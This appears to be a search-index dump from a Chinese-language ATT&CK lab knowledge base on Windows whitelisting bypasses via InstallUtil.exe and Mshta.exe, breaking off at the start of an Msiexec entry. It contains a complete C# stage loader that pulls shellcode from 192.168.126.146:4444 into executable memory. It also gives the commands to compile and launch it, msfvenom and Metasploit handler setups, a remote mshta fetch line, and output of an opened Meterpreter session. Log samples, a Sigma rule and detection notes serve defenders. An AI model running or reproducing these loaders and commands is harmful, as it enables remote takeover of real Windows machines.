<p>C:\\Windows\\Microsoft.NET\\Framework64\\v\\InstallUtil.exe</p> <p>InstallUtil.exe\u7531Microsoft\u8fdb\u884c\u6570\u5b57\u7b7e\u540d\u3002\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u4f7f\u7528InstallUtil\u901a\u8fc7\u53d7\u4fe1\u4efb\u7684Windows\u5b9e\u7528\u7a0b\u5e8f\u6765\u4ee3\u7406\u6267\u884c\u4ee3\u7801\u3002\u653b\u51fb\u8005\u8fd8\u53ef\u4ee5\u7528Installutil\u6765\u7ed5\u8fc7\u8fdb\u7a0b\u767d\u540d\u5355\uff0c\u65b9\u6cd5\u662f\u5728\u4e8c\u8fdb\u5236\u6587\u4ef6\u4e2d\u4f7f\u7528\u5c5e\u6027\uff0c\u8fd9\u4e9b\u5c5e\u6027\u6267\u884c\u7528\u5c5e\u6027[System.ComponentModel.RunInstaller(true)]\u4fee\u9970\u7684\u7c7b\u3002</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-004-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Installutil.exe%E6%89%A7%E8%A1%8Cpayload/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>\u8bf4\u660e\uff1aInstallutil.exe\u6240\u5728\u8def\u5f84\u6ca1\u6709\u88ab\u7cfb\u7edf\u6dfb\u52a0PATH\u73af\u5883\u53d8\u91cf\u4e2d\uff0c\u56e0\u6b64\uff0cInstallutil\u547d\u4ee4\u65e0\u6cd5\u8bc6\u522b\u3002</p> <p>\u8865\u5145\u8bf4\u660e\uff1a\u5728\u9ad8\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\uff0c\u53ef\u4ee5\u901a\u8fc7\u914d\u7f6e\u7b56\u7565\uff0c\u5bf9\u8fdb\u7a0b\u547d\u4ee4\u884c\u53c2\u6570\u8fdb\u884c\u8bb0\u5f55\u3002\u65e5\u5fd7\u7b56\u7565\u5f00\u542f\u65b9\u6cd5\uff1a<code>\u672c\u5730\u8ba1\u7b97\u673a\u7b56\u7565&gt;\u8ba1\u7b97\u673a\u914d\u7f6e&gt;\u7ba1\u7406\u6a21\u677f&gt;\u7cfb\u7edf&gt;\u5ba1\u6838\u8fdb\u7a0b\u521b\u5efa&gt;\u5728\u8fc7\u7a0b\u521b\u5efa\u4e8b\u4ef6\u4e2d\u52a0\u5165\u547d\u4ee4\u884c&gt;\u542f\u7528</code>\uff0c\u540c\u6837\u4e5f\u53ef\u4ee5\u5728\u4e0d\u540c\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u90e8\u7f72sysmon\uff0c\u901a\u8fc7sysmon\u65e5\u5fd7\u8fdb\u884c\u76d1\u63a7\u3002</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-004-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Installutil.exe%E6%89%A7%E8%A1%8Cpayload/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>windows \u5b89\u5168\u65e5\u5fd7/SYSMON\u65e5\u5fd7\uff08\u9700\u8981\u81ea\u884c\u5b89\u88c5\uff09</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-004-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Installutil.exe%E6%89%A7%E8%A1%8Cpayload/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":""},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-004-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Installutil.exe%E6%89%A7%E8%A1%8Cpayload/#_4","title":"\u73af\u5883\u51c6\u5907","text":"<p>\u653b\u51fb\u673a\uff1aKali2019</p> <p>\u9776\u673a\uff1awindows server 2012</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-004-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Installutil.exe%E6%89%A7%E8%A1%8Cpayload/#_5","title":"\u653b\u51fb\u5206\u6790","text":""},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-004-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Installutil.exe%E6%89%A7%E8%A1%8Cpayload/#x64-cs","title":"x64 CS","text":"<pre><code>using System;using System.Net;using System.Linq;using System.Net.Sockets;using System.Runtime.InteropServices;using System.Threading;using System.Configuration.Install;using System.Windows.Forms;\npublic class GQLBigHgUniLuVx {\npublic static void Main()\n{\nwhile(true)\n{{ MessageBox.Show(\"doge\"); Console.ReadLine();}}\n}\n}\n\n[System.ComponentModel.RunInstaller(true)]\npublic class esxWUYUTWShqW : System.Configuration.Install.Installer\n{\npublic override void Uninstall(System.Collections.IDictionary zWrdFAUHmunnu)\n{\njkmhGrfzsKQeCG.LCIUtRN();\n}\n\n}\npublic class jkmhGrfzsKQeCG\n{ [DllImport(\"kernel\")] private static extern UInt32 VirtualAlloc(UInt32 YUtHhF,UInt32 VenifEUR, UInt32 NIHbxnOmrgiBGL, UInt32 KIheHEUxhAfOI);\n[DllImport(\"kernel32\")] private static extern IntPtr CreateThread(UInt32 GDmElasSZbx, UInt32 rGECFEZG, UInt32 UyBSrAIp,IntPtr sPEeJlufmodo, UInt32 jmzHRQU, ref UInt32 SnpQPGMvDbMOGmn);\n[DllImport(\"kernel32\")] private static extern UInt32 WaitForSingleObject(IntPtr pRIwbzTTS, UInt32 eRLAWWYQnq);\nstatic byte[] ErlgHH(string ZwznjBJY,int KsMEeo) {\nIPEndPoint qAmSXHOKCbGlysd = new IPEndPoint(IPAddress.Parse(ZwznjBJY), KsMEeo);\nSocket XXxIoIXNCle = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);\n\ntry { XXxIoIXNCle.Connect(qAmSXHOKCbGlysd); }\ncatch { return null;}\nbyte[] UmquAHRnhhpuE = new byte[4];\nXXxIoIXNCle.Receive(UmquAHRnhhpuE,4,0);\nint kFVRSNnpj = BitConverter.ToInt32(UmquAHRnhhpuE,0);\nbyte[] qaYyFq = new byte[kFVRSNnpj +5];\nint SRCDELibA =0;\nwhile(SRCDELibA &lt; kFVRSNnpj)\n{ SRCDELibA += XXxIoIXNCle.Receive(qaYyFq, SRCDELibA +5,(kFVRSNnpj - SRCDELibA)&lt;4096 ? (kFVRSNnpj - SRCDELibA) : 4096,0);}\nbyte[] TvvzOgPLqwcFFv =BitConverter.GetBytes((int)XXxIoIXNCle.Handle);\nArray.Copy(TvvzOgPLqwcFFv,0, qaYyFq,1,4); qaYyFq[0]=0xBF;\nreturn qaYyFq;}\nstatic void cmMtjerv(byte[] HEHUjJhkrNS) {\nif(HEHUjJhkrNS !=null) {\nUInt32 WcpKfU = VirtualAlloc(0,(UInt32)HEHUjJhkrNS.Length,0x1000,0x40);\nMarshal.Copy(HEHUjJhkrNS,0,(IntPtr)(WcpKfU), HEHUjJhkrNS.Length);\nIntPtr UhxtIFnlOQatrk = IntPtr.Zero;\nUInt32 wdjYKFDCCf =0;\nIntPtr XVYcQxpp = IntPtr.Zero;\nUhxtIFnlOQatrk = CreateThread(0,0, WcpKfU, XVYcQxpp,0, ref wdjYKFDCCf);\nWaitForSingleObject(UhxtIFnlOQatrk,0xFFFFFFFF); }}\npublic static void LCIUtRN() {\n\nbyte[] IBtCWU =null; IBtCWU = ErlgHH(\"192.168.126.146\",4444);\ncmMtjerv(IBtCWU);\n} }\n</code></pre>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-004-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Installutil.exe%E6%89%A7%E8%A1%8Cpayload/#payload","title":"\u7f16\u8bd1payload","text":"<pre><code>C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /r:System.EnterpriseServices.dll /r:System.IO.Compression.dll /target:library /out:Micropoor.exe  /unsafe C:\\Users\\Administrator\\Desktop\\a\\installutil.cs\n</code></pre>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-004-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Installutil.exe%E6%89%A7%E8%A1%8Cpayload/#_6","title":"\u6267\u884c\u76d1\u542c","text":"<p>\u653b\u51fb\u673a,\u6ce8\u610f\u914d\u7f6eset AutoRunScript migrate f (AutoRunScript\u662fmsf\u4e2d\u4e00\u4e2a\u5f3a\u5927\u7684\u81ea\u52a8\u5316\u7684\u540e\u6e17\u900f\u5de5\u5177\uff0c\u8fd9\u91ccmigrate\u53c2\u6570\u662f\u8fc1\u79fb\u6728\u9a6c\u5230\u5176\u4ed6\u8fdb\u7a0b)</p> <pre><code>msf5 &gt; use exploits/multi/handler\nmsf5 exploit(multi/handler) &gt; set PAYLOAD windows/meterpreter/reverse_tcp\nPAYLOAD =&gt; windows/meterpreter/reverse_tcp\nmsf5 exploit(multi/handler) &gt; set lhost 192.168.126.146\nlhost =&gt; 192.168.126.146\nmsf5 exploit(multi/handler) &gt; set lport 4444\nlport =&gt; 4444\nmsf5 exploit(multi/handler) &gt; exploit\n</code></pre> <p></p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-004-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Installutil.exe%E6%89%A7%E8%A1%8Cpayload/#payload_1","title":"\u6267\u884cpayload","text":"<pre><code>C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U Micropoor.exe\n</code></pre>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-004-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Installutil.exe%E6%89%A7%E8%A1%8Cpayload/#shell","title":"\u53cd\u5f39shell","text":""},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-004-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Installutil.exe%E6%89%A7%E8%A1%8Cpayload/#_7","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<pre><code>EventID:4688 #\u5b89\u5168\u65e5\u5fd7\uff0cwindows server 2012\u4ee5\u4e0a\u914d\u7f6e\u5ba1\u6838\u7b56\u7565\uff0c\u53ef\u5bf9\u547d\u4ee4\u53c2\u6570\u8fdb\u884c\u8bb0\u5f55\n</code></pre>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-004-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Installutil.exe%E6%89%A7%E8%A1%8Cpayload/#_8","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":"<p>\u65e0\u5177\u4f53\u68c0\u6d4b\u89c4\u5219\uff0c\u53ef\u6839\u636e\u8fdb\u7a0b\u521b\u5efa\u4e8b\u4ef64688/1\uff08\u8fdb\u7a0b\u540d\u79f0\u3001\u547d\u4ee4\u884c\uff09\u8fdb\u884c\u76d1\u63a7\u3002\u672c\u76d1\u63a7\u65b9\u6cd5\u9700\u8981\u81ea\u884c\u5b89\u88c5\u914d\u7f6e\u5ba1\u6838\u7b56\u7565/sysmon\u3002</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-004-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Installutil.exe%E6%89%A7%E8%A1%8Cpayload/#_9","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1218-004</p> <p>https://attack.mitre.org/techniques/T1218/004/</p> <p>\u57fa\u4e8e\u767d\u540d\u5355Installutil.exe\u6267\u884cpayload</p> <p>https://micro8.gitbook.io/micro8/contents-1/71-80/72-ji-yu-bai-ming-dan-installutil.exe-zhi-hang-payload-di-er-ji</p> <p>\u57fa\u4e8e\u767d\u540d\u5355\u7684Payload</p> <p>https://blog.csdn.net/weixin_30790841/article/details/101848854</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-005-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Mshta.exe%E6%89%A7%E8%A1%8Cpayload/","title":"T1218-005-win-\u57fa\u4e8e\u767d\u540d\u5355Mshta.exe\u6267\u884cpayload","text":""},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-005-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Mshta.exe%E6%89%A7%E8%A1%8Cpayload/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>Mshta.exe\u662f\u4e00\u4e2a\u6267\u884c\u5fae\u8f6fHTA\uff08HTML\u5e94\u7528\uff09\u7684\u5b9e\u7528\u7a0b\u5e8f\u3002HTA\u6587\u4ef6\u6269\u5c55\u540d\u4e3a.hta\u3002HTA\u662f\u72ec\u7acb\u7684\u5e94\u7528\uff0c\u4f7f\u7528\u4e0eInternetExplorer\u76f8\u540c\u7684\u6a21\u578b\u548c\u6280\u672f\u6765\u6267\u884c\uff0c\u4f46\u5728\u6d4f\u89c8\u5668\u4e4b\u5916\u6267\u884c\u3002</p> <p>\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u4f7f\u7528mshta.exe\u901a\u8fc7\u53d7\u4fe1\u4efb\u7684Windows\u5b9e\u7528\u7a0b\u5e8f\u6765\u4ee3\u7406\u6267\u884c\u6076\u610f.hta\u6587\u4ef6\u548cJavascript\u6216VBScript\u3002\u5df2\u77e5\u653b\u51fb\u8005\u5728\u6700\u521d\u653b\u51fb\u9636\u6bb5\u5229\u7528mshta.exe\u6765\u6267\u884c\u4ee3\u7801\u7684\u51e0\u4e2a\u4f8b\u5b50\u3002</p> <p>Mshta.exe\u53ef\u901a\u8fc7\u5185\u8054\u811a\u672c\u6765\u6267\u884c\u6587\u4ef6\uff1amshtavbscript:Close(Execute(\"GetObject(\"\"script:https[:]//webserver/payload[.]sct\"\")\"))</p> <p>\u4e5f\u53ef\u4ee5\u76f4\u63a5\u4eceURL\u6267\u884c\uff1amshta http[:]//webserver/payload[.]hta</p> <p>Mshta.exe\u53ef\u7ed5\u8fc7\u4e0d\u8003\u8651\u5176\u6f5c\u5728\u7528\u9014\u7684\u5e94\u7528\u767d\u540d\u5355\u89e3\u51b3\u65b9\u6848\u3002\u7531\u4e8emshta.exe\u5728InternetExplorer\u7684\u5b89\u5168\u4e0a\u4e0b\u6587\u4e4b\u5916\u6267\u884c\uff0c\u56e0\u6b64\u5b83\u8fd8\u4f1a\u7ed5\u8fc7\u6d4f\u89c8\u5668\u5b89\u5168\u8bbe\u7f6e\u3002</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-005-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Mshta.exe%E6%89%A7%E8%A1%8Cpayload/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>Mshta.exe\u662f\u5fae\u8f6fWindows\u64cd\u4f5c\u7cfb\u7edf\u76f8\u5173\u7a0b\u5e8f\uff0c\u82f1\u6587\u5168\u79f0Microsoft HTML Application\uff0c\u53ef\u7ffb\u8bd1\u4e3a\u5fae\u8f6f\u8d85\u6587\u672c\u6807\u8bb0\u8bed\u8a00\u5e94\u7528\uff0c\u7528\u4e8e\u6267\u884c.HTA\u6587\u4ef6\u3002</p> <p>\u8bf4\u660e\uff1aMshta\u6240\u5728\u8def\u5f84\u5df2\u88ab\u7cfb\u7edf\u6dfb\u52a0PATH\u73af\u5883\u53d8\u91cf\u4e2d\uff0c\u56e0\u6b64\uff0c\u53ef\u76f4\u63a5\u6267\u884cMshta.exe\u547d\u4ee4\u3002</p> <p>\u8865\u5145\u8bf4\u660e\uff1a\u5728\u9ad8\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\uff0c\u53ef\u4ee5\u901a\u8fc7\u914d\u7f6e\u7b56\u7565\uff0c\u5bf9\u8fdb\u7a0b\u547d\u4ee4\u884c\u53c2\u6570\u8fdb\u884c\u8bb0\u5f55\u3002\u65e5\u5fd7\u7b56\u7565\u5f00\u542f\u65b9\u6cd5\uff1a<code>\u672c\u5730\u8ba1\u7b97\u673a\u7b56\u7565&gt;\u8ba1\u7b97\u673a\u914d\u7f6e&gt;\u7ba1\u7406\u6a21\u677f&gt;\u7cfb\u7edf&gt;\u5ba1\u6838\u8fdb\u7a0b\u521b\u5efa&gt;\u5728\u8fc7\u7a0b\u521b\u5efa\u4e8b\u4ef6\u4e2d\u52a0\u5165\u547d\u4ee4\u884c&gt;\u542f\u7528</code>\uff0c\u540c\u6837\u4e5f\u53ef\u4ee5\u5728\u4e0d\u540c\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u90e8\u7f72sysmon\uff0c\u901a\u8fc7sysmon\u65e5\u5fd7\u8fdb\u884c\u76d1\u63a7\u3002</p> <p>Windows 7 \u9ed8\u8ba4\u4f4d\u7f6e\uff1a</p> <p>C:\\Windows\\System32\\mshta.exe</p> <p>C:\\Windows\\SysWOW64\\mshta.exe</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-005-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Mshta.exe%E6%89%A7%E8%A1%8Cpayload/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>windows \u5b89\u5168\u65e5\u5fd7\uff08\u9700\u8981\u81ea\u884c\u914d\u7f6e\uff09</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-005-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Mshta.exe%E6%89%A7%E8%A1%8Cpayload/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":""},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-005-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Mshta.exe%E6%89%A7%E8%A1%8Cpayload/#_4","title":"\u73af\u5883\u51c6\u5907","text":"<p>\u653b\u51fb\u673a\uff1aKali2019</p> <p>\u9776\u673a\uff1awindows server 2012</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-005-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Mshta.exe%E6%89%A7%E8%A1%8Cpayload/#_5","title":"\u653b\u51fb\u5206\u6790","text":""},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-005-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Mshta.exe%E6%89%A7%E8%A1%8Cpayload/#payload","title":"\u751f\u6210payload","text":"<pre><code>root@12306Br0:~# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.126.146 LPORT=4444 -f hta-psh -o test5.hta\n\n\u66ff\u6362\u76f8\u5173\u4fe1\u606f\n</code></pre>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-005-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Mshta.exe%E6%89%A7%E8%A1%8Cpayload/#_6","title":"\u6267\u884c\u76d1\u542c","text":"<pre><code>use exploit/windows/misc/hta_server\nmsf exploit(windows/misc/hta_server) &gt; set lhost 192.168.126.146\nmsf exploit(windows/misc/hta_server) &gt; set srvhost 192.168.126.146\nmsf exploit(windows/misc/hta_server) &gt; exploit\n</code></pre>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-005-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Mshta.exe%E6%89%A7%E8%A1%8Cpayload/#payload_1","title":"\u9776\u673a\u6267\u884cpayload","text":"<pre><code>mshta.exe http://192.168.126.146:8080/Uj6Tcv.hta  #\u9700\u8981\u5b89\u88c5.net Framework 3.5\n</code></pre>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-005-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Mshta.exe%E6%89%A7%E8%A1%8Cpayload/#shell","title":"\u53cd\u5f39shell","text":"<pre><code>msf5 exploit(windows/misc/hta_server) &gt; exploit\n[*] Exploit running as background job 0.\n[*] Exploit completed, but no session was created.\n\n[*] Started reverse TCP handler on 192.168.126.146:4444\n[*] Using URL: http://192.168.126.146:8080/Uj6Tcv.hta\n[*] Server started.\nmsf5 exploit(windows/misc/hta_server) &gt; [*] 192.168.126.156  hta_server - Delivering Payload\n[*] Sending stage (180291 bytes) to 192.168.126.156\n[*] Meterpreter session 1 opened (192.168.126.146:4444 -&gt; 192.168.126.156:50232) at 2020-04-14 11:03:33 +0800\n</code></pre>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-005-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Mshta.exe%E6%89%A7%E8%A1%8Cpayload/#_7","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>\u5b89\u5168\u65e5\u5fd7\u80fd\u591f\u6e05\u6670\u7684\u8bb0\u5f55\u547d\u4ee4\u884c\u53c2\u6570\uff0c\u622a\u53d6windows\u5b89\u5168\u4e8b\u4ef64688\u8fdb\u7a0b\u521b\u5efa\u90e8\u5206\u5185\u5bb9\uff1a</p> <pre><code>\u4e8b\u4ef6ID\uff1a 4688\n\u8fdb\u7a0b\u4fe1\u606f:\n\u65b0\u8fdb\u7a0b ID:0xb20\n\u65b0\u8fdb\u7a0b\u540d\u79f0:C:\\Windows\\System32\\mshta.exe\n\u4ee4\u724c\u63d0\u5347\u7c7b\u578b:TokenElevationTypeDefault (1)\n\u521b\u5efa\u8005\u8fdb\u7a0b ID:0x13c\n\u8fdb\u7a0b\u547d\u4ee4\u884c:mshta.exe  http://192.168.126.146:8080/Uj6Tcv.hta\n</code></pre>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-005-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Mshta.exe%E6%89%A7%E8%A1%8Cpayload/#_8","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":"<p>\u901a\u8fc7\u8fdb\u7a0b\u76d1\u63a7\u6765\u68c0\u6d4b\u548c\u5206\u6790mshta.exe\u7684\u6267\u884c\u548c\u53c2\u6570\u3002\u67e5\u627e\u5728\u547d\u4ee4\u884c\u4e2d\u6267\u884c\u539f\u59cb\u6216\u6df7\u6dc6\u811a\u672c\u7684mshta.exe\u3002\u6bd4\u8f83mshta.exe\u7684\u8fd1\u671f\u8c03\u7528\u4e0e\u5386\u53f2\u5df2\u77e5\u5408\u6cd5\u53c2\u6570\u53ca\u5df2\u6267\u884c\u4e8c\u8fdb\u5236\u6587\u4ef6\u6765\u786e\u5b9a\u662f\u5426\u6709\u5f02\u5e38\u548c\u6f5c\u5728\u7684\u653b\u51fb\u6d3b\u52a8\u3002\u5728mshta.exe\u8c03\u7528\u4e4b\u524d\u548c\u4e4b\u540e\u4f7f\u7528\u7684\u547d\u4ee4\u53c2\u6570\u4e5f\u53ef\u7528\u4e8e\u786e\u5b9a\u6b63\u5728\u6267\u884c\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\u7684\u6765\u6e90\u548c\u76ee\u7684\u3002</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-005-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Mshta.exe%E6%89%A7%E8%A1%8Cpayload/#sigma","title":"sigma\u89c4\u5219","text":"<pre><code>title: MSHTA Suspicious Execution 01\nid: cc7abbd0-762b-41e3-8a26-57ad50d2eea3\nstatus: experimental\ndescription: Detection for mshta.exe suspicious execution patterns sometimes involving file polyglotism\ndate: 2019/02/22\nmodified: 2019/02/22\nauthor: Diego Perez (@darkquassar), Markus Neis, Swisscom (Improve Rule)\nreferences:\n    - http://blog.sevagas.com/?Hacking-around-HTA-files\n    - https://0x00sec.org/t/clientside-exploitation-in-2018-how-pentesting-has-changed/7356\n    - https://docs.microsoft.com/en-us/dotnet/standard/data/xml/xslt-stylesheet-scripting-using-msxsl-script\n    - https://medium.com/tsscyber/pentesting-and-hta-bypassing-powershell-constrained-language-mode-53a42856c997\ntags:\n    - attack.defense_evasion\n    - attack.t1140\nlogsource:\n    category: process_creation\n    product: windows\nfalsepositives: \n    - False positives depend on scripts and administrative tools used in the monitored environment\nlevel: high\ndetection:\n    selection1:\n        Image: '*\\mshta.exe'\n        CommandLine: \n            - '*vbscript*' \n            - '*.jpg*'\n            - '*.png*'\n            - '*.lnk*'\n            # - '*.chm*'  # could be prone to false positives\n            - '*.xls*'\n            - '*.doc*'\n            - '*.zip*'\n    condition:\n        selection1 \n</code></pre>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-005-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Mshta.exe%E6%89%A7%E8%A1%8Cpayload/#_9","title":"\u5efa\u8bae","text":"<p>\u6682\u65e0</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-005-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Mshta.exe%E6%89%A7%E8%A1%8Cpayload/#_10","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1218-005</p> <p>https://attack.mitre.org/techniques/T1218/005/</p> <p>\u8fdc\u63a7\u514d\u6740\u4e13\u9898(37)-\u767d\u540d\u5355Mshta.exe\u6267\u884cpayload</p> <p>http://sec.nmask.cn/article_content?a_id=d1a4d20858c9283aef9ef49d2e98352c</p> <p>\u68c0\u6d4b\u53ef\u7591\u7684Mshta\u4f7f\u7528\u60c5\u51b5</p> <p>https://github.com/microsoft/Microsoft-365-Defender-Hunting-Queries/blob/master/Execution/detect-suspicious-mshta-usage.md</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-007-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Msiexec.exe%E6%89%A7%E8%A1%8CPayload/","title":"T1218-007-win-\u57fa\u4e8e\u767d\u540d\u5355Msiexec\u6267\u884cPayload","text":""},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-007-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Msiexec.exe%E6%89%A7%E8%A1%8CPayload/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u53ef\u4fe1\u6570\u5b57\u8bc1\u4e66\u7b7e\u7f72\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\u5728Windows\u64cd\u4f5c\u7cfb\u7edf\u6267\u884c\u65f6\uff0c\u53ef\u901a\u8fc7\u6570\u5b57\u7b7e\u540d\u9a8c\u8bc1\u4fdd\u62a4\u3002Windows\u5b89\u88c5\u8fc7\u7a0b\u4e2d\u9ed8\u8ba4\u5b89\u88c5\u7684\u4e00\u4e9b\u5fae\u8f6f\u7b7e\u540d\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\u53ef\u7528\u6765\u4ee3\u7406\u6267\u884c\u5176\u5b83\u6587\u4ef6\u3002\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u6ee5\u7528\u6b64\u6280\u672f\u6765\u6267\u884c\u53ef\u80fd\u7ed5\u8fc7\u5e94\u7528\u767d\u540d\u5355\u673a\u5236\u548c\u7cfb\u7edf\u7b7e\u540d\u9a8c\u8bc1\u7684\u6076\u610f\u6587\u4ef6\u3002\u8be5\u6280\u672f\u8003\u8651\u4e86\u73b0\u6709\u6280\u672f\u4e2d\u5c1a\u672a\u8003\u8651\u7684\u4ee3\u7406\u6267\u884c\u65b9\u6cd5\u3002</p>"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-007-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Msiexec.exe%E6%89%A7%E8%A1%8CPayload/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>Msiexec\u662fWindows Installer\u7684\u4e00\u90e8\u5206\u3002\u7528\u4e8e\u5b89\u88c5Windows Installer\u5b89\u88c5\u5305\uff08MSI\uff09,\u4e00\u822c\u5728\u8fd0\u884cMicrosoft Update\u5b89\u88c5\u66f4\u65b0\u6216\u5b89\u88c5\u90e8\u5206\u8f6f\u4ef6\u7684\u65f6\u5019\u51fa\u73b0\uff0c\u5360\u7528\u5185\u5b58\u6bd4\u8f83\u5927\u3002\u5e76\u4e14\u96c6\u6210\u4e8eWindows 2003\uff0cWindows 7\u7b49\u3002</p> <p>\u8bf4\u660e\uff1aMsiexec.exe\u6240\u5728\u8def\u5f84\u5df2\u88ab\u7cfb\u7edf\u6dfb\u52a0PATH\u73af\u5883\u53d8\u91cf\u4e2d\uff0c\u56e0\u6b64\uff0cMsiexec\u547d\u4ee4\u53ef\u8bc6\u522b\u3002Ftp.exe\u662fWindows\u672c\u8eab\u81ea\u5e26\u7684\u4e00\u4e2a\u7a0b\u5e8f\uff0c\u5c5e\u4e8e\u5fae\u8f6fFTP\u5de5\u5177\uff0c\u63d0\u4f9b\u57fa\u672c\u7684FTP\u8bbf\u95ee\u3002</p> <p>\u8bf4\u660e\uff1aFtp.exe\u6240\u5728\u8def\u5f84\u5df2\u88ab\u7cfb\u7edf\u6dfb\u52a0PATH\u73af\u5883\u53d8\u91cf\u4e2d\uff0c\u56e0\u6b64\uff0cFtp.exe\u547d\u4ee4\u53ef\u8bc6\u522b\u3002</p> <p>\u00b7 msiexec.exe /q /i\"C:\\path\\to\\file.msi\"</p> <p>\u00b7 msiexec.exe /q /i 